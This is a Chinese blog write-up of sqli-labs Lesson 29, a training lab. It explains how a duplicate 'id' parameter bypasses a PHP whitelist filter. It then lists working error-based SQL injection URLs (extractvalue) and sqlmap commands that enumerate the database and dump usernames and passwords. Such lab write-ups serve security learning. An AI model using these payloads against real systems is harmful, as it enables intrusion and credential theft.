---
title: sqli-labs lession-29 GET基于错误-阻抗不匹配-有WAF的web应用
date: 2018-10-14 15:10:34
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession 29 GET基于错误-阻抗不匹配-有WAF的web应用

---



## 登录界面

![001](/img/sql/Lesson-29/001.png)

## 分析

这一课真正的登录界面是在login.php里,跟index.php的区别是进行了过滤。

login.php中接受参数依次通过了自定义函数java_implimentation和whitelist过滤。

![002](/img/sql/Lesson-29/002.png)

```
function java_implimentation($query_string)
{
	$q_s = $query_string;
	$qs_array= explode("&",$q_s);


	foreach($qs_array as $key => $value)
	{
		$val=substr($value,0,2);
		if($val=="id")
		{
			$id_value=substr($value,3,30); 
			return $id_value;
			echo "<br>";
			break;
		}
	}
}

function whitelist($input)
{
	$match = preg_match("/^\d+$/", $input);
	if($match)
	{
		//echo "you are good";
		//return $match;
	}
	else
	{	
		header('Location: hacked.php');
		//echo "you are bad";
	}
}
```

java_implimentation通过explode将url中传递的参数以&分割保存在数组中，随后查找id和id的内容。whitelist检查id的值是否是纯数字。不符合规范跳转错误界面。

![003](/img/sql/Lesson-29/003.png)

但是通过这个例子发现有重复参数的时候它没有检查。&是传参中用来多个参数传递的。就有了下面的绕过方法。

![004](/img/sql/Lesson-29/004.png)

## 手注

### 获取字段数

`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' order by 4%23`

![005](/img/sql/Lesson-29/005.png)

### 获取数据库名

`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' and extractvalue(null,concat(0x7e,database(),0x7e))%23`

![006](/img/sql/Lesson-29/006.png)

### 获取表名

`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' and extractvalue(null,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e))%23`

![007](/img/sql/Lesson-29/007.png)

### 获取列名

`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e))%23`

![008](/img/sql/Lesson-29/008.png)

### 获取字段

`http://192.168.75.133/sql/Less-29/login.php?id=1&id=2' and extractvalue(null,concat(0x7e,(select concat(username,'~',password) from security.users limit 1,1),0x7e))%23`

![009](/img/sql/Lesson-29/009.png)

## SQLMAP

```
--technique E:检查报错注入方式
--threads 10：并发线程数为10
--flush-session:刷新session
--fresh-queries:发起新查询
-v 3：显示测试过程
```

`sqlmap -u "http://192.168.75.133/sql/Less-29/login.php?id=1&id=2" --dbms mysql --technique E --threads 10 --flush-session --fresh-queries -v 3`

![010](/img/sql/Lesson-29/010.png)

`sqlmap -u "http://192.168.75.133/sql/Less-29/login.php?id=1&id=2" --dbms mysql --technique E --threads 10 --dbs`

![011](/img/sql/Lesson-29/011.png)

`sqlmap -u "http://192.168.75.133/sql/Less-29/login.php?id=1&id=2" --dbms mysql --technique E --threads 10 -D security -T users --columns --dump`

![012](/img/sql/Lesson-29/012.png)

